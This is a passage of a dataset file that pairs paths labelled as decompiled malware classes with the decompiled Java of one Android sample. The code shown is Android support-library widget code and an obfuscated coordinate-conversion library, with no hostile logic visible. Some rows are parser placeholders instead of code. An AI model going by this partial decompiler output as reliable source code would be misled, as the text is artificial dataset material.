void setSubmitButtonEnabled(  View searchView,  boolean enabled){     SearchViewCompatHoneycomb.setSubmitButtonEnabled(searchView,enabled);   }   @Override public boolean isSubmitButtonEnabled(  View searchView){     return SearchViewCompatHoneycomb.isSubmitButtonEnabled(searchView);   }   @Override public void setQueryRefinementEnabled(  View searchView,  boolean enable){     SearchViewCompatHoneycomb.setQueryRefinementEnabled(searchView,enable);   }   @Override public boolean isQueryRefinementEnabled(  View searchView){     return SearchViewCompatHoneycomb.isQueryRefinementEnabled(searchView);   }   @Override public void setMaxWidth(  View searchView,  int maxpixels){     SearchViewCompatHoneycomb.setMaxWidth(searchView,maxpixels);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\SearchViewCompatIcs.code","class SearchViewCompatIcs {   SearchViewCompatIcs(){   } public static class MySearchView extends SearchView {     public MySearchView(    Context context){       super(context);     }     @Override public void onActionViewCollapsed(){       setQuery("""",false);       super.onActionViewCollapsed();     }   }   public static View newSearchView(  Context context){     return new MySearchView(context);   }   public static void setImeOptions(  View searchView,  int imeOptions){     ((SearchView)searchView).setImeOptions(imeOptions);   }   public static void setInputType(  View searchView,  int inputType){     ((SearchView)searchView).setInputType(inputType);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\SearchViewCompatIcsImpl.code","static class SearchViewCompatIcsImpl extends SearchViewCompatHoneycombImpl {   SearchViewCompatIcsImpl(){   }   @Override public View newSearchView(  Context context){     return SearchViewCompatIcs.newSearchView(context);   }   @Override public void setImeOptions(  View searchView,  int imeOptions){     SearchViewCompatIcs.setImeOptions(searchView,imeOptions);   }   @Override public void setInputType(  View searchView,  int inputType){     SearchViewCompatIcs.setInputType(searchView,inputType);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\SearchViewCompatImpl.code","interface SearchViewCompatImpl {   CharSequence getQuery(  View view);   boolean isIconified(  View view);   boolean isQueryRefinementEnabled(  View view);   boolean isSubmitButtonEnabled(  View view);   Object newOnCloseListener(  OnCloseListenerCompat onCloseListenerCompat);   Object newOnQueryTextListener(  OnQueryTextListenerCompat onQueryTextListenerCompat);   View newSearchView(  Context context);   void setIconified(  View view,  boolean z);   void setImeOptions(  View view,  int i);   void setInputType(  View view,  int i);   void setMaxWidth(  View view,  int i);   void setOnCloseListener(  Object obj,  Object obj2);   void setOnQueryTextListener(  Object obj,  Object obj2);   void setQuery(  View view,  CharSequence charSequence,  boolean z);   void setQueryHint(  View view,  CharSequence charSequence);   void setQueryRefinementEnabled(  View view,  boolean z);   void setSearchableInfo(  View view,  ComponentName componentName);   void setSubmitButtonEnabled(  View view,  boolean z); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\SearchViewCompatStubImpl.code","static class SearchViewCompatStubImpl implements SearchViewCompatImpl {   SearchViewCompatStubImpl(){   }   @Override public View newSearchView(  Context context){     return null;   }   @Override public void setSearchableInfo(  View searchView,  ComponentName searchableComponent){   }   @Override public void setImeOptions(  View searchView,  int imeOptions){   }   @Override public void setInputType(  View searchView,  int inputType){   }   @Override public Object newOnQueryTextListener(  OnQueryTextListenerCompat listener){     return null;   }   @Override public void setOnQueryTextListener(  Object searchView,  Object listener){   }   @Override public Object newOnCloseListener(  OnCloseListenerCompat listener){     return null;   }   @Override public void setOnCloseListener(  Object searchView,  Object listener){   }   @Override public CharSequence getQuery(  View searchView){     return null;   }   @Override public void setQuery(  View searchView,  CharSequence query,  boolean submit){   }   @Override public void setQueryHint(  View searchView,  CharSequence hint){   }   @Override public void setIconified(  View searchView,  boolean iconify){   }   @Override public boolean isIconified(  View searchView){     return true;   }   @Override public void setSubmitButtonEnabled(  View searchView,  boolean enabled){   }   @Override public boolean isSubmitButtonEnabled(  View searchView){     return false;   }   @Override public void setQueryRefinementEnabled(  View searchView,  boolean enable){   }   @Override public boolean isQueryRefinementEnabled(  View searchView){     return false;   }   @Override public void setMaxWidth(  View searchView,  int maxpixels){   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\SimpleCursorAdapter.code","public class SimpleCursorAdapter extends ResourceCursorAdapter {   private CursorToStringConverter mCursorToStringConverter;   protected int[] mFrom;   String[] mOriginalFrom;   private int mStringConversionColumn;   protected int[] mTo;   private ViewBinder mViewBinder; public interface CursorToStringConverter {     CharSequence convertToString(    Cursor cursor);   } public interface ViewBinder {     boolean setViewValue(    View view,    Cursor cursor,    int i);   }   @Deprecated public SimpleCursorAdapter(  Context context,  int layout,  Cursor c,  String[] from,  int[] to){     super(context,layout,c);     this.mStringConversionColumn=-1;     this.mTo=to;     this.mOriginalFrom=from;     findColumns(from);   }   public SimpleCursorAdapter(  Context context,  int layout,  Cursor c,  String[] from,  int[] to,  int flags){     super(context,layout,c,flags);     this.mStringConversionColumn=-1;     this.mTo=to;     this.mOriginalFrom=from;     findColumns(from);   }   @Override public void bindView(  View view,  Context context,  Cursor cursor){     ViewBinder binder=this.mViewBinder;     int count=this.mTo.length;     int[] from=this.mFrom;     int[] to=this.mTo;     for (int i=0; i < count; i++) {       View v=view.findViewById(to[i]);       if (v != null) {         boolean bound=false;         if (binder != null) {           bound=binder.setViewValue(v,cursor,from[i]);         }         if (bound) {           continue;         }  else {           String text=cursor.getString(from[i]);           if (text == null) {             text="""";           }           if (v instanceof TextView) {             setViewText((TextView)v,text);           }  else           if (v instanceof ImageView) {             setViewImage((ImageView)v,text);           }  else {             throw new IllegalStateException(v.getClass().getName() + "" is not a  view that can be bounds by this SimpleCursorAdapter"");           }         }       }     }   }   public ViewBinder getViewBinder(){     return this.mViewBinder;   }   public void setViewBinder(  ViewBinder viewBinder){     this.mViewBinder=viewBinder;   }   public void setViewImage(  ImageView v,  String value){     try {       v.setImageResource(Integer.parseInt(value));     }  catch (    NumberFormatException e) {       v.setImageURI(Uri.parse(value));     }   }   public void setViewText(  TextView v,  String text){     v.setText(text);   }   public int getStringConversionColumn(){     return this.mStringConversionColumn;   }   public void setStringConversionColumn(  int stringConversionColumn){     this.mStringConversionColumn=stringConversionColumn;   }   public CursorToStringConverter getCursorToStringConverter(){     return this.mCursorToStringConverter;   }   public void setCursorToStringConverter(  CursorToStringConverter cursorToStringConverter){     this.mCursorToStringConverter=cursorToStringConverter;   }   @Override public CharSequence convertToString(  Cursor cursor){     if (this.mCursorToStringConverter != null) {       return this.mCursorToStringConverter.convertToString(cursor);     }     if (this.mStringConversionColumn > -1) {       return cursor.getString(this.mStringConversionColumn);     }     return super.convertToString(cursor);   }   private void findColumns(  String[] from){     if (this.mCursor != null) {       int count=from.length;       if (this.mFrom == null || this.mFrom.length != count) {         this.mFrom=new int[count];       }       for (int i=0; i < count; i++) {         this.mFrom[i]=this.mCursor.getColumnIndexOrThrow(from[i]);       }       return;     }     this.mFrom=null;   }   @Override public Cursor swapCursor(  Cursor c){     Cursor res=super.swapCursor(c);     findColumns(this.mOriginalFrom);     return res;   }   public void changeCursorAndColumns(  Cursor c,  String[] from,  int[] to){     this.mOriginalFrom=from;     this.mTo=to;     super.changeCursor(c);     findColumns(this.mOriginalFrom);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\SimpleDrawerListener.code","public static abstract class SimpleDrawerListener implements DrawerListener {   @Override public void onDrawerSlide(  View drawerView,  float slideOffset){   }   @Override public void onDrawerOpened(  View drawerView){   }   @Override public void onDrawerClosed(  View drawerView){   }   @Override public void onDrawerStateChanged(  int newState){   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\SimplePanelSlideListener.code","public static class SimplePanelSlideListener implements PanelSlideListener {   @Override public void onPanelSlide(  View panel,  float slideOffset){   }   @Override public void onPanelOpened(  View panel){   }   @Override public void onPanelClosed(  View panel){   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\SlidingPaneLayout.code","!org.eclipse.jdt.core.dom.TypeDeclaration@d5c2d79"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\SlidingPanelLayoutImpl.code","public interface SlidingPanelLayoutImpl {   void invalidateChildRegion(  SlidingPaneLayout slidingPaneLayout,  View view); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\SlidingPanelLayoutImplBase.code","static class SlidingPanelLayoutImplBase implements SlidingPanelLayoutImpl {   SlidingPanelLayoutImplBase(){   }   @Override public void invalidateChildRegion(  SlidingPaneLayout parent,  View child){     ViewCompat.postInvalidateOnAnimation(parent,child.getLeft(),child.getTop(),child.getRight(),child.getBottom());   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\SlidingPanelLayoutImplJB.code","static class SlidingPanelLayoutImplJB extends SlidingPanelLayoutImplBase {   private Method mGetDisplayList;   private Field mRecreateDisplayList;   SlidingPanelLayoutImplJB(){     try {       this.mGetDisplayList=View.class.getDeclaredMethod(""getDisplayList"",(Class[])null);     }  catch (    NoSuchMethodException e) {       Log.e(SlidingPaneLayout.TAG,""Couldn't fetch getDisplayList method; dimming won't work right."",e);     }     try {       this.mRecreateDisplayList=View.class.getDeclaredField(""mRecreateDisplayList"");       this.mRecreateDisplayList.setAccessible(true);     }  catch (    NoSuchFieldException e2) {       Log.e(SlidingPaneLayout.TAG,""Couldn't fetch mRecreateDisplayList field; dimming will be slow."",e2);     }   }   @Override public void invalidateChildRegion(  SlidingPaneLayout parent,  View child){     if (this.mGetDisplayList != null && this.mRecreateDisplayList != null) {       try {         this.mRecreateDisplayList.setBoolean(child,true);         this.mGetDisplayList.invoke(child,(Object[])null);       }  catch (      Exception e) {         Log.e(SlidingPaneLayout.TAG,""Error refreshing display list state"",e);       }       super.invalidateChildRegion(parent,child);       return;     }     child.invalidate();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\SlidingPanelLayoutImplJBMR1.code","static class SlidingPanelLayoutImplJBMR1 extends SlidingPanelLayoutImplBase {   SlidingPanelLayoutImplJBMR1(){   }   @Override public void invalidateChildRegion(  SlidingPaneLayout parent,  View child){     ViewCompat.setLayerPaint(child,((LayoutParams)child.getLayoutParams()).dimPaint);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\ViewBinder.code","public interface ViewBinder {   boolean setViewValue(  View view,  Cursor cursor,  int i); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\ViewDragCallback.code","public class ViewDragCallback extends ViewDragHelper.Callback {   private final int mAbsGravity;   private ViewDragHelper mDragger;   private final Runnable mPeekRunnable=new Runnable(){     @Override public void run(){       ViewDragCallback.this.peekDrawer();     }   } ;   public ViewDragCallback(  int gravity){     this.mAbsGravity=gravity;   }   public void setDragger(  ViewDragHelper dragger){     this.mDragger=dragger;   }   public void removeCallbacks(){     DrawerLayout.this.removeCallbacks(this.mPeekRunnable);   }   @Override public boolean tryCaptureView(  View child,  int pointerId){     return DrawerLayout.this.isDrawerView(child) && DrawerLayout.this.checkDrawerViewAbsoluteGravity(child,this.mAbsGravity) && DrawerLayout.this.getDrawerLockMode(child) == 0;   }   @Override public void onViewDragStateChanged(  int state){     DrawerLayout.this.updateDrawerState(this.mAbsGravity,state,this.mDragger.getCapturedView());   }   @Override public void onViewPositionChanged(  View changedView,  int left,  int top,  int dx,  int dy){     float offset;     int childWidth=changedView.getWidth();     if (DrawerLayout.this.checkDrawerViewAbsoluteGravity(changedView,3)) {       offset=(childWidth + left) / childWidth;     }  else {       int width=DrawerLayout.this.getWidth();       offset=(width - left) / childWidth;     }     DrawerLayout.this.setDrawerViewOffset(changedView,offset);     changedView.setVisibility(offset == 0.0f ? 4 : 0);     DrawerLayout.this.invalidate();   }   @Override public void onViewCaptured(  View capturedChild,  int activePointerId){     LayoutParams lp=(LayoutParams)capturedChild.getLayoutParams();     lp.isPeeking=false;     closeOtherDrawer();   }   private void closeOtherDrawer(){     int otherGrav=this.mAbsGravity == 3 ? 5 : 3;     View toClose=DrawerLayout.this.findDrawerWithGravity(otherGrav);     if (toClose != null) {       DrawerLayout.this.closeDrawer(toClose);     }   }   @Override public void onViewReleased(  View releasedChild,  float xvel,  float yvel){     int left;     float offset=DrawerLayout.this.getDrawerViewOffset(releasedChild);     int childWidth=releasedChild.getWidth();     if (DrawerLayout.this.checkDrawerViewAbsoluteGravity(releasedChild,3)) {       left=(xvel > 0.0f || (xvel == 0.0f && offset > 0.5f)) ? 0 : -childWidth;     }  else {       int width=DrawerLayout.this.getWidth();       left=(xvel < 0.0f || (xvel == 0.0f && offset > 0.5f)) ? width - childWidth : width;     }     this.mDragger.settleCapturedViewAt(left,releasedChild.getTop());     DrawerLayout.this.invalidate();   }   @Override public void onEdgeTouched(  int edgeFlags,  int pointerId){     DrawerLayout.this.postDelayed(this.mPeekRunnable,160L);   }   public void peekDrawer(){     View toCapture;     int childLeft;     int peekDistance=this.mDragger.getEdgeSize();     boolean leftEdge=this.mAbsGravity == 3;     if (leftEdge) {       toCapture=DrawerLayout.this.findDrawerWithGravity(3);       childLeft=(toCapture != null ? -toCapture.getWidth() : 0) + peekDistance;     }  else {       toCapture=DrawerLayout.this.findDrawerWithGravity(5);       childLeft=DrawerLayout.this.getWidth() - peekDistance;     }     if (toCapture != null) {       if (((leftEdge && toCapture.getLeft() < childLeft) || (!leftEdge && toCapture.getLeft() > childLeft)) && DrawerLayout.this.getDrawerLockMode(toCapture) == 0) {         LayoutParams lp=(LayoutParams)toCapture.getLayoutParams();         this.mDragger.smoothSlideViewTo(toCapture,childLeft,toCapture.getTop());         lp.isPeeking=true;         DrawerLayout.this.invalidate();         closeOtherDrawer();         DrawerLayout.this.cancelChildViewTouch();       }     }   }   @Override public boolean onEdgeLock(  int edgeFlags){     return false;   }   @Override public void onEdgeDragStarted(  int edgeFlags,  int pointerId){     View toCapture;     if ((edgeFlags & 1) == 1) {       toCapture=DrawerLayout.this.findDrawerWithGravity(3);     }  else {       toCapture=DrawerLayout.this.findDrawerWithGravity(5);     }     if (toCapture != null && DrawerLayout.this.getDrawerLockMode(toCapture) == 0) {       this.mDragger.captureChildView(toCapture,pointerId);     }   }   @Override public int getViewHorizontalDragRange(  View child){     return child.getWidth();   }   @Override public int clampViewPositionHorizontal(  View child,  int left,  int dx){     if (DrawerLayout.this.checkDrawerViewAbsoluteGravity(child,3)) {       return Math.max(-child.getWidth(),Math.min(left,0));     }     int width=DrawerLayout.this.getWidth();     return Math.max(width - child.getWidth(),Math.min(left,width));   }   @Override public int clampViewPositionVertical(  View child,  int top,  int dy){     return child.getTop();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\ViewDragHelper.code","!org.eclipse.jdt.core.dom.TypeDeclaration@bc53a18"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\b.a.a\a.code","public class a extends d {   private static a e=null;   private a(){     super(6377563.396d,6356256.909d);   }   public static a a(){     if (e == null) {       e=new a();     }     return e;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\b.a.a\b.code","public abstract class b {   private c f4a;   public b(  c cVar){     a(cVar);   }   public abstract e a();   public void a(  c cVar){     this.f4a=cVar;   }   public c b(){     return this.f4a;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\b.a.a\c.code","public abstract class c {   protected String f5a;   protected d f6b;   protected double c;   protected double d;   protected double e;   protected double f;   protected double g;   protected double h;   protected double i;   public String a(){     return this.f5a;   }   public d b(){     return this.f6b;   }   public double c(){     return this.f;   }   public double d(){     return this.c;   }   public double e(){     return this.d;   }   public double f(){     return this.e;   }   public double g(){     return this.g;   }   public double h(){     return this.h;   }   public double i(){     return this.i;   }   public String toString(){     return String.valueOf(a()) + "" "" + this.f6b.toString()+ "" dx=""+ this.c+ "" dy=""+ this.d+ "" dz=""+ this.e+ "" ds=""+ this.f+ "" rx=""+ this.g+ "" ry=""+ this.h+ "" rz=""+ this.i;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\b.a.a\d.code","public abstract class d {   protected double f7a;   protected double f8b;   protected double c;   protected double d;   public d(  double d,  double d2){     this.f7a=d;     this.f8b=d2;     double d3=d * d;     this.d=(d - d2) / d;     this.c=(d3 - (d2 * d2)) / d3;   }   public d(  double d,  double d2,  double d3){     if (Double.isNaN(d2) && Double.isNaN(d3)) {       throw new IllegalArgumentException(""At least one of semiMinorAxis and eccentricitySquared must be defined"");     }     this.f7a=d;     double d4=d * d;     if (Double.isNaN(d2)) {       this.f8b=Math.sqrt((1.0d - d3) * d4);     }  else {       this.f8b=d2;     }     double d5=this.f8b * this.f8b;     this.d=(this.f7a - this.f8b) / this.f7a;     if (Double.isNaN(d3)) {       this.c=(d4 - d5) / d4;     }  else {       this.c=d3;     }   }   public double b(){     return this.c;   }   public double c(){     return this.d;   }   public double d(){     return this.f7a;   }   public double e(){     return this.f8b;   }   public String toString(){     return ""[semi-major axis = "" + d() + "", semi-minor axis = ""+ e()+ ""]"";   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\b.a.a\e.code","public class e {   public static final int f9a=1;   public static final int f10b=-1;   public static final int c=1;   public static final int d=-1;   private double e;   private double f;   private double g;   private c h;   public e(  double d2,  double d3){     this(d2,d3,0.0d,new l());   }   public e(  double d2,  double d3,  double d4){     this(d2,d3,d4,new l());   }   public e(  double d2,  double d3,  double d4,  c cVar){     this.h=new l();     if (d2 < -90.0d || d2 > 90.0d) {       throw new IllegalArgumentException(""Latitude ("" + d2 + "") is invalid. Must be between -90.0 and 90.0 inclusive."");     }     if (d3 < -180.0d || d3 > 180.0d) {       throw new IllegalArgumentException(""Longitude ("" + d3 + "") is invalid. Must be between -180.0 and 180.0 inclusive."");     }     this.e=d2;     this.f=d3;     this.g=d4;     this.h=cVar;   }   public e(  int i,  int i2,  double d2,  int i3,  int i4,  int i5,  double d3,  int i6){     this(i,i2,d2,i3,i4,i5,d3,i6,0.0d,new l());   }   public e(  int i,  int i2,  double d2,  int i3,  int i4,  int i5,  double d3,  int i6,  double d4){     this(i,i2,d2,i3,i4,i5,d3,i6,d4,new l());   }   public e(  int i,  int i2,  double d2,  int i3,  int i4,  int i5,  double d3,  int i6,  double d4,  c cVar){     this.h=new l();     if (i < 0.0d || i > 90.0d || i2 < 0.0d || i2 >= 60.0d || d2 < 0.0d || d2 >= 60.0d || !(i3 == -1 || i3 == 1)) {       throw new IllegalArgumentException(""Invalid latitude"");     }     if (i4 < 0.0d || i4 > 90.0d || i5 < 0.0d || i5 >= 60.0d || d3 < 0.0d || d3 >= 60.0d || !(i6 == -1 || i6 == 1)) {       throw new IllegalArgumentException(""Invalid longitude"");     }     this.e=i3 * (i + (i2 / 60.0d) + (d2 / 3600.0d));     this.f=i6 * (i4 + (i5 / 60.0d) + (d3 / 3600.0d));     this.h=cVar;   }   private String s(){     return String.valueOf(Math.abs(i())) + "" "" + j()+ "" ""+ k()+ "" ""+ (h() >= 0.0d ? ""N"" : ""S"");   }   private String t(){     return String.valueOf(Math.abs(n())) + "" "" + o()+ "" ""+ p()+ "" ""+ (m() >= 0.0d ? ""E"" : ""W"");   }   public double a(  e eVar){     double radians=Math.toRadians(g());     double radians2=Math.toRadians(eVar.g());     double radians3=Math.toRadians(l());     double radians4=Math.toRadians(eVar.l());     return 6366.707d * Math.acos((Math.cos(radians) * Math.cos(radians2) * Math.cos(radians4 - radians3)) + (Math.sin(radians) * Math.sin(radians2)));   }   public String a(){     return String.valueOf(s()) + "" "" + t();   }   public void a(  c cVar){     double d2=1.0d;     if (!(this.h instanceof l) && !(cVar instanceof l)) {       a(new l());     }  else     if (cVar instanceof l) {       return;     }  else {       d2=-1.0d;     }     double d3=this.h.b().d();     double b2=this.h.b().b();     double radians=Math.toRadians(this.e);     double radians2=Math.toRadians(this.f);     double sqrt=d3 / Math.sqrt(1.0d - (k.a(radians) * b2));     double d4=this.g;     double cos=(sqrt + d4) * Math.cos(radians) * Math.cos(radians2);     double sin=Math.sin(radians2) * (sqrt + d4) * Math.cos(radians);     double sin2=((sqrt * (1.0d - b2)) + d4) * Math.sin(radians);     double d5=cVar.d() * d2;     double e=cVar.e() * d2;     double f=cVar.f() * d2;     double c2=(cVar.c() * d2) / 1000000.0d;     double radians3=Math.toRadians(cVar.g() / 3600.0d) * d2;     double radians4=Math.toRadians(cVar.h() / 3600.0d) * d2;     double d6=c2 + 1.0d;     double d7=d5 + (cos * d6) + ((-radians3) * sin * d6)+ (radians4 * sin2 * d6);     double radians5=(d2 * Math.toRadians(cVar.i() / 3600.0d) * cos* d6) + e + (sin * d6)+ ((-radians3) * sin2 * d6);     double d8=((-radians4) * cos * d6) + f + (sin * radians3 * d6)+ (sin2 * d6);     double d9=cVar.b().d();     double b3=cVar.b().b();     double degrees=Math.toDegrees(Math.atan(radians5 / d7));     double sqrt2=Math.sqrt((radians5 * radians5) + (d7 * d7));     double atan=Math.atan(d8 / ((1.0d - b3) * sqrt2));     for (int i=1; i < 10; i++) {       atan=Math.atan(((Math.sin(atan) * ((d9 / Math.sqrt(1.0d - (k.a(atan) * b3))) * b3)) + d8) / sqrt2);     }     this.e=Math.toDegrees(atan);     this.f=degrees;   }   public double b(  e eVar){     return a(eVar) / 1.609344d;   }   public i b(){     a a2=a.a();     double radians=Math.toRadians(49.0d);     double radians2=Math.toRadians(-2.0d);     double d2=a2.d();     double e=a2.e();     double b2=a2.b();     double radians3=Math.toRadians(g());     double radians4=Math.toRadians(l());     double d3=(d2 - e) / (d2 + e);     double pow=d2 * 0.9996012717d * Math.pow(1.0d - (k.a(radians3) * b2),-0.5d);     double pow2=d2 * 0.9996012717d * (1.0d - b2)* Math.pow(1.0d - (b2 * k.a(radians3)),-1.5d);     double d4=(pow / pow2) - 1.0d;     double sin=((e * 0.9996012717d) * (((((((1.0d + d3) + ((1.25d * d3) * d3)) + (((1.25d * d3) * d3) * d3)) * (radians3 - radians)) - (((((3.0d * d3) + ((3.0d * d3) * d3)) + (((2.625d * d3) * d3) * d3)) * Math.sin(radians3 - radians)) * Math.cos(radians3 + radians))) + (((((1.875d * d3) * d3) + (((1.875d * d3) * d3) * d3)) * Math.sin(2.0d * (radians3 - radians))) * Math.cos(2.0d * (radians3 + radians)))) - (Math.cos((radians + radians3) * 3.0d) * ((d3 * ((1.4583333333333333d * d3) * d3)) * Math.sin(3.0d * (radians3 - radians)))))) - 100000.0d;     double sin2=(pow / 2.0d) * Math.sin(radians3) * Math.cos(radians3);     double sin3=(pow / 24.0d) * Math.sin(radians3) * Math.pow(Math.cos(radians3),3.0d)* ((5.0d - k.e(radians3)) + (9.0d * d4));     double sin4=(pow / 720.0d) * Math.sin(radians3) * Math.pow(Math.cos(radians3),5.0d)* ((61.0d - (58.0d * k.e(radians3))) + Math.pow(Math.tan(radians3),4.0d));     return new i(((radians4 - radians2) * Math.cos(radians3) * pow) + 400000.0d + (Math.pow(radians4 - radians2,3.0d) * ((pow / pow2) - k.e(radians3)) * (pow / 6.0d)* Math.pow(Math.cos(radians3),3.0d))+ (Math.pow(radians4 - radians2,5.0d) * ((((5.0d - (18.0d * k.e(radians3))) + Math.pow(Math.tan(radians3),4.0d)) + (14.0d * d4)) - (d4 * (k.e(radians3) * 58.0d))) * (pow / 120.0d)* Math.pow(Math.cos(radians3),5.0d)),sin + (sin2 * Math.pow(radians4 - radians2,2.0d)) + (Math.pow(radians4 - radians2,4.0d) * sin3)+ (Math.pow(radians4 - radians2,6.0d) * sin4));   }   public j c(){     if (h() < -80.0d || h() > 84.0d) {       throw new g(""Latitude ("" + h() + "") falls outside the UTM grid."");     }     if (this.f == 180.0d) {       this.f=-180.0d;     }     double d2=m.a().d();     double b2=m.a().b();     double d3=this.f;     double d4=this.e;     double d5=d4 * 0.017453292519943295d;     double d6=d3 * 0.017453292519943295d;     int floor=((int)Math.floor((180.0d + d3) / 6.0d)) + 1;     if (d4 >= 56.0d && d4 < 64.0d && d3 >= 3.0d && d3 < 12.0d) {       floor=32;     }     if (d4 >= 72.0d && d4 < 84.0d) {       if (d3 >= 0.0d && d3 < 9.0d) {         floor=31;       }  else       if (d3 >= 9.0d && d3 < 21.0d) {         floor=33;       }  else       if (d3 >= 21.0d && d3 < 33.0d) {         floor=35;       }  else       if (d3 >= 33.0d && d3 < 42.0d) {         floor=37;       }     }     char a2=j.a(d4);     double d7=b2 / (1.0d - b2);     double sqrt=d2 / Math.sqrt(1.0d - ((Math.sin(d5) * b2) * Math.sin(d5)));     double tan=Math.tan(d5) * Math.tan(d5);     double cos=Math.cos(d5) * d7 * Math.cos(d5);     double cos2=(d6 - (((((floor - 1) * 6) - 180) + 3) * 0.017453292519943295d)) * Math.cos(d5);     double sin=(((((((1.0d - (b2 / 4.0d)) - (((3.0d * b2) * b2) / 64.0d)) - ((((5.0d * b2) * b2) * b2) / 256.0d)) * d5) - (((((3.0d * b2) / 8.0d) + (((3.0d * b2) * b2) / 32.0d)) + ((((45.0d * b2) * b2) * b2) / 1024.0d)) * Math.sin(2.0d * d5))) + (((((15.0d * b2) * b2) / 256.0d) + ((((45.0d * b2) * b2) * b2) / 1024.0d)) * Math.sin(4.0d * d5))) - (((b2 * ((35.0d * b2) * b2)) / 3072.0d) * Math.sin(6.0d * d5))) * d2;     double pow=(0.9996d * sqrt * (((((1.0d - tan) + cos) * Math.pow(cos2,3.0d)) / 6.0d) + cos2 + ((((((5.0d - (18.0d * tan)) + (tan * tan)) + (72.0d * cos)) - (58.0d * d7)) * Math.pow(cos2,5.0d)) / 120.0d))) + 500000.0d;     double pow2=0.9996d * (sin + ((((Math.pow(cos2,6.0d) * ((((61.0d - (58.0d * tan)) + (tan * tan)) + (600.0d * cos)) - (d7 * 330.0d))) / 720.0d) + ((cos2 * cos2) / 2.0d) + (((((5.0d - tan) + (9.0d * cos)) + ((4.0d * cos) * cos)) * Math.pow(cos2,4.0d)) / 24.0d)) * Math.tan(d5) * sqrt));     if (d4 < 0.0d) {       pow2+=1.0E7d;     }     return new j(floor,a2,pow,pow2);   }   public f d(){     return new f(c());   }   public void e(){     double d2=a.a().d();     double b2=a.a().b();     double radians=Math.toRadians(this.e);     double radians2=Math.toRadians(this.f);     double sqrt=d2 / Math.sqrt(1.0d - (k.a(radians) * b2));     double cos=(sqrt + 0.0d) * Math.cos(radians) * Math.cos(radians2);     double sin=Math.sin(radians2) * (sqrt + 0.0d) * Math.cos(radians);     double sin2=((sqrt * (1.0d - b2)) + 0.0d) * Math.sin(radians);     double radians3=Math.toRadians(4.172222E-5d);     double radians4=Math.toRadians(6.861111E-5d);     double d3=446.448d + ((1.0d - 2.04894E-5d) * cos) + ((-radians3) * sin)+ (radians4 * sin2);     double radians5=(-125.157d) + (Math.toRadians(2.3391666E-4d) * cos) + ((1.0d - 2.04894E-5d) * sin)+ ((-radians3) * sin2);     double d4=(sin * radians3) + 542.06d + (cos * (-radians4))+ (sin2 * (1.0d - 2.04894E-5d));     double d5=m.a().d();     double b3=m.a().b();     double degrees=Math.toDegrees(Math.atan(radians5 / d3));     double sqrt2=Math.sqrt((d3 * d3) + (radians5 * radians5));     double atan=Math.atan(d4 / ((1.0d - b3) * sqrt2));     for (int i=1; i < 10; i++) {       atan=Math.atan(((Math.sin(atan) * ((d5 / Math.sqrt(1.0d - (k.a(atan) * b3))) * b3)) + d4) / sqrt2);     }     this.e=Math.toDegrees(atan);     this.f=degrees;   }   public void f(){     m a2=m.a();     double d2=a2.d();     double b2=a2.b();     double radians=Math.toRadians(this.e);     double radians2=Math.toRadians(this.f);     double sqrt=d2 / Math.sqrt(1.0d - (k.a(radians) * b2));     double cos=(sqrt + 0.0d) * Math.cos(radians) * Math.cos(radians2);     double sin=Math.sin(radians2) * (sqrt + 0.0d) * Math.cos(radians);     double sin2=((sqrt * (1.0d - b2)) + 0.0d) * Math.sin(radians);     double radians3=Math.toRadians(-4.172222E-5d);     double radians4=Math.toRadians(-6.861111E-5d);     double d3=(-446.448d) + ((1.0d + 2.04894E-5d) * cos) + ((-radians3) * sin)+ (radians4 * sin2);     double radians5=125.157d + (Math.toRadians(-2.3391666E-4d) * cos) + ((1.0d + 2.04894E-5d) * sin)+ ((-radians3) * sin2);     double d4=(radians3 * sin) + (-542.06d) + (cos * (-radians4))+ (sin2 * (1.0d + 2.04894E-5d));     double d5=a.a().d();     double b3=a.a().b();     double degrees=Math.toDegrees(Math.atan(radians5 / d3));     double sqrt2=Math.sqrt((d3 * 